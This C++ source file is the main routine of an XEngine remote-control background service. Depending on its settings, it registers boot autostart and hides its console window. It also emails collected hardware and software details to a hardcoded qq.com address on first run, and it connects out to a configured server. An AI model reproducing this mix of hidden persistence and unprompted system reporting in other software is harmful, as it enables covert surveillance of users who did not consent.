#include "XContral_Hdr.h"

BOOL bIsRun = FALSE;
XLOG xhLog = NULL;
SOCKET hTCPSocket = 0;
SOCKET hUDPSocket = 0;
int m_nTaskSerial = 0;
shared_ptr<std::thread> pSTDThread_Http = NULL;
shared_ptr<std::thread> pSTDThread_TCP = NULL;
shared_ptr<std::thread> pSTDThread_UDP = NULL;
shared_ptr<std::thread> pSTDThread_App = NULL;
XENGINE_SERVERCONFIG st_ServiceConfig;
XENGINE_CONFIGAPP st_APPConfig;
XENGIEN_EMAILCONFIG st_EMailConfig;

void ServiceApp_Stop(int signo)
{
	if (bIsRun)
	{
		XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_WARN, _T("服务器退出..."));
		bIsRun = FALSE;

		if (NULL != pSTDThread_Http)
		{
			pSTDThread_Http->join();
		}
		if (NULL != pSTDThread_TCP)
		{
			pSTDThread_TCP->join();
		}
		if (NULL != pSTDThread_UDP)
		{
			pSTDThread_UDP->join();
		}
		if (NULL != pSTDThread_App)
		{
			pSTDThread_App->join();
		}
		XClient_TCPSelect_Close(hTCPSocket);
		XClient_TCPSelect_Close(hUDPSocket);
		HelpComponents_XLog_Destroy(xhLog);
		exit(0);
	}
}
int main(int argc, char** argv)
{
#if ((XENGINE_VERSION_KERNEL < 7) || (XENGINE_VERSION_MAIN < 20))
{
	printf("xengine version is not match\n");
}
#endif
#ifdef _WINDOWS
	WSADATA st_WSAData;
	WSAStartup(MAKEWORD(2, 2), &st_WSAData);

	LPCSTR lpszWndName = _T("XEngine_XContralApp");
#endif
	bIsRun = TRUE;
	HELPCOMPONENTS_XLOG_CONFIGURE st_XLogConfig;

	memset(&st_XLogConfig, '\0', sizeof(HELPCOMPONENTS_XLOG_CONFIGURE));
	memset(&st_ServiceConfig, '\0', sizeof(XENGINE_SERVERCONFIG));
	memset(&st_APPConfig, '\0', sizeof(XENGINE_CONFIGAPP));
	memset(&st_EMailConfig, '\0', sizeof(XENGIEN_EMAILCONFIG));

	if (!XContral_Parament(argc, argv))
	{
		printf("初始化参数失败!\n");
		goto NETSERVICE_APPEXIT;
	}
	st_XLogConfig.XLog_MaxBackupFile = st_ServiceConfig.st_XLog.nMaxCount;
	st_XLogConfig.XLog_MaxSize = st_ServiceConfig.st_XLog.nMaxSize;
	strcpy(st_XLogConfig.tszFileName, st_ServiceConfig.st_XLog.tszLogFile);
	xhLog = HelpComponents_XLog_Init(HELPCOMPONENTS_XLOG_OUTTYPE_FILE | HELPCOMPONENTS_XLOG_OUTTYPE_STD, &st_XLogConfig);
	if (NULL == xhLog)
	{
		printf("初始化日志服务失败,无法继续!\n");
		goto NETSERVICE_APPEXIT;
	}
	HelpComponents_XLog_SetLogPriority(xhLog, st_ServiceConfig.st_XLog.nLogLeave);
	XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_INFO, _T("启动服务中，初始化日志系统成功"));

	signal(SIGINT, ServiceApp_Stop);
	signal(SIGTERM, ServiceApp_Stop);
	signal(SIGABRT, ServiceApp_Stop);

	if (st_EMailConfig.bCreateEmail)
	{
		UCHAR tszEnBuffer[4096];
		CHAR tszDeBuffer[4096];
		LPCSTR lpszSrcFile = _T("./XContral_Config/Manage_EMail.ini");
		LPCSTR lpszDstFile = _T("./XContral_Config/Manage_EMail.ini.dat");

		memset(tszEnBuffer, '\0', sizeof(tszEnBuffer));
		memset(tszDeBuffer, '\0', sizeof(tszDeBuffer));

		FILE* pSt_DeFile = fopen(lpszSrcFile, _T("rb"));
		FILE* pSt_EnFile = fopen(lpszDstFile, _T("wb"));

		if (NULL == pSt_EnFile || NULL == pSt_DeFile)
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("启动服务中，检测到加密脚本失败，读取文件失败，错误:%d"), errno);
			return FALSE;
		}
		int nDRet = fread(tszDeBuffer, 1, sizeof(tszDeBuffer), pSt_DeFile);
		if (nDRet <= 0)
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("启动服务中，检测到加密脚本失败，读取数据失败，错误:%d"), errno);
			return FALSE;
		}
		if (!OPenSsl_XCrypto_Encoder(tszDeBuffer, &nDRet, tszEnBuffer, _T("xengineemail")))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("启动服务中，解密电子邮件信息失败,无法发送邮件信息，错误:%lX"), OPenSsl_GetLastError());
			return FALSE;
		}
		fwrite(tszEnBuffer, 1, nDRet, pSt_EnFile);
		fclose(pSt_EnFile);
		fclose(pSt_DeFile);
	}

	XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_INFO, _T("启动服务中，初始化信号处理成功"));
	if (st_ServiceConfig.bAutoStart)
	{
		if (!SystemApi_Process_AutoStart(_T("XEngine"), _T("XEngine_XContral")))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("启动服务中，注册软件开机启动失败!错误:%lX"), SystemApi_GetLastError());
			goto NETSERVICE_APPEXIT;
		}
		XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_INFO, _T("启动服务中，注册软件开机启动成功"));
	}
	if (st_ServiceConfig.bHideWnd)
	{
#ifdef _WINDOWS
		BOOL bIsFound = FALSE;
		SetConsoleTitle(lpszWndName);
		HWND hWnd = GetDesktopWindow();
		hWnd = GetWindow(hWnd, GW_CHILD);
		CHAR tszTitle[MAX_PATH];
		while (NULL != hWnd)
		{
			memset(tszTitle, '\0', MAX_PATH);
			GetWindowText(hWnd, tszTitle, MAX_PATH);
			if (0 == _tcsncmp(lpszWndName, tszTitle, _tcslen(lpszWndName)))
			{
				bIsFound = TRUE;
				break;
			}
			hWnd = GetNextWindow(hWnd, GW_HWNDNEXT);
		}
		if (bIsFound)
		{
			ShowWindow(hWnd, SW_HIDE);
		}
#endif
	}

	if (0 != _taccess(st_ServiceConfig.tszTmpFile, 0))
	{
		if (XContral_Parament_EMail())
		{
			if (st_EMailConfig.bEnable)
			{
				int nSWLen = 2048;
				int nHWLen = 2048;
				CHAR tszSWInfo[2048];
				CHAR tszHWInfo[2048];
				CHAR tszRPInfo[8192];

				memset(tszSWInfo, '\0', sizeof(tszSWInfo));
				memset(tszHWInfo, '\0', sizeof(tszHWInfo));
				memset(tszRPInfo, '\0', sizeof(tszRPInfo));

				LPCSTR lpszSendAddr = _T("<486179@qq.com>");

				XNETHANDLE xhSmtp;
				if (!RfcComponents_EMailClient_SmtpInit(&xhSmtp, &st_EMailConfig.st_EMailSmtp))
				{
					XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("启动服务中，初始化SMTP服务失败,错误:%lX"), EMailClient_GetLastError());
					goto NETSERVICE_APPEXIT;
				}
				if (!XContral_Info_HardWare(tszHWInfo, &nHWLen))
				{
					XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("启动服务中，获取系统硬件信息失败,错误:%lX"), XInfo_GetLastError());
					goto NETSERVICE_APPEXIT;
				}
				if (!XContral_Info_SoftWare(tszSWInfo, &nSWLen))
				{
					XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("启动服务中，获取系统软件信息失败,错误:%lX"), XInfo_GetLastError());
					goto NETSERVICE_APPEXIT;
				}
				_stprintf(tszRPInfo, _T("%s\r\n%s"), tszSWInfo, tszHWInfo);
				if (!RfcComponents_EMailClient_SmtpSend(xhSmtp, lpszSendAddr, _T("XEngine控制后台信息报告"), tszRPInfo))
				{
					XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("启动服务中，投递系统信息消息失败,错误:%lX"), EMailClient_GetLastError());
					goto NETSERVICE_APPEXIT;
				}
				RfcComponents_EMailClient_SmtpClose(xhSmtp);

				FILE* pSt_File = fopen(st_ServiceConfig.tszTmpFile, "wb");
				if (NULL == pSt_File)
				{
					XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("启动服务中，写入临时文件失败,错误:%d"), errno);
					goto NETSERVICE_APPEXIT;
				}
				fwrite(_T("XEngine"), 1, 7, pSt_File);
				fclose(pSt_File);
				XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_INFO, _T("启动服务中，投递系统信息消息成功"));
			}
			else
			{
				XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_WARN, _T("启动服务中，邮件配置不正确,无法投递信息!"));
			}
		}
	}
	else
	{
		XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_INFO, _T("启动服务中，检测到信息已经投递,不需要再次投递!"));
	}
	//是否启用了客户端
	if (st_ServiceConfig.st_Client.bEnable)
	{
		if (IPPROTO_TCP == st_ServiceConfig.st_Client.nIPType)
		{
			if (!XClient_TCPSelect_Create(&hTCPSocket, st_ServiceConfig.st_Client.tszIPAddr, st_ServiceConfig.st_Client.nPort))
			{
				XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("启动服务中，创建TCP连接失败,地址:%s,端口:%d,错误:%lX"), st_ServiceConfig.st_Client.tszIPAddr, st_ServiceConfig.st_Client.nPort, XClient_GetLastError());
				goto NETSERVICE_APPEXIT;
			}
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_INFO, _T("启动服务中，创建TCP连接成功,地址:%s,端口:%d"), st_ServiceConfig.st_Client.tszIPAddr, st_ServiceConfig.st_Client.nPort);
			pSTDThread_TCP = make_shared<std::thread>(XContral_Thread_TCPTask);
			if (!pSTDThread_TCP->joinable())
			{
				XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("启动服务中，创建TCP任务线程失败"));
				goto NETSERVICE_APPEXIT;
			}
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_INFO, _T("启动服务中，创建TCP任务线程成功"));
		}
		else
		{
			if (!XClient_UDPSelect_Create(&hUDPSocket, st_ServiceConfig.st_Client.tszIPAddr, st_ServiceConfig.st_Client.nPort))
			{
				XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("启动服务中，创建UDP连接失败,地址:%s,端口:%d,错误:%lX"), st_ServiceConfig.st_Client.tszIPAddr, st_ServiceConfig.st_Client.nPort, XClient_GetLastError());
				goto NETSERVICE_APPEXIT;
			}
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_INFO, _T("启动服务中，创建UDP连接成功,地址:%s,端口:%d"), st_ServiceConfig.st_Client.tszIPAddr, st_ServiceConfig.st_Client.nPort);
			pSTDThread_UDP = make_shared<std::thread>(XContral_Thread_UDPTask);
			if (!pSTDThread_UDP->joinable())
			{
				XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("启动服务中，创建UDP任务线程失败"));
				goto NETSERVICE_APPEXIT;
			}
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_INFO, _T("启动服务中，创建UDP任务线程成功"));
		}
	}
	else
	{
		XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_WARN, _T("启动服务中，客户端被设置为不自动连接"));
	}
	//创建任务线程
	bIsRun = TRUE;
	pSTDThread_Http = make_shared<std::thread>(XContral_Thread_HttpTask);
	if (!pSTDThread_Http->joinable())
	{
		XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("启动服务中，创建HTTP任务线程失败"));
		goto NETSERVICE_APPEXIT;
	}
	XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_INFO, _T("启动服务中，创建HTTP任务线程成功"));

	pSTDThread_App = make_shared<std::thread>(APPManage_Thread_Process);
	if (!pSTDThread_App->joinable())
	{
		XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("启动服务器，启动进程守护线程失败，无法继续..."));
		goto NETSERVICE_APPEXIT;
	}
	XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_INFO, _T("启动服务中，初始化进程的守护线程成功"));

	XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_INFO, _T("启动服务中，所有服务已经启动完毕,程序运行中..."));
	while (bIsRun)
	{
		std::this_thread::sleep_for(std::chrono::seconds(1));
	}

NETSERVICE_APPEXIT:
	if (bIsRun)
	{
		XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_WARN, _T("后台控制服务关闭，服务器退出..."));
		bIsRun = FALSE;

		if (NULL != pSTDThread_Http)
		{
			pSTDThread_Http->join();
		}
		if (NULL != pSTDThread_TCP)
		{
			pSTDThread_TCP->join();
		}
		if (NULL != pSTDThread_UDP)
		{
			pSTDThread_UDP->join();
		}
		if (NULL != pSTDThread_App)
		{
			pSTDThread_App->join();
		}
		XClient_TCPSelect_Close(hTCPSocket);
		XClient_TCPSelect_Close(hUDPSocket);
		HelpComponents_XLog_Destroy(xhLog);
	}

#ifdef _WINDOWS
	WSACleanup();
#endif
	return 0;
}
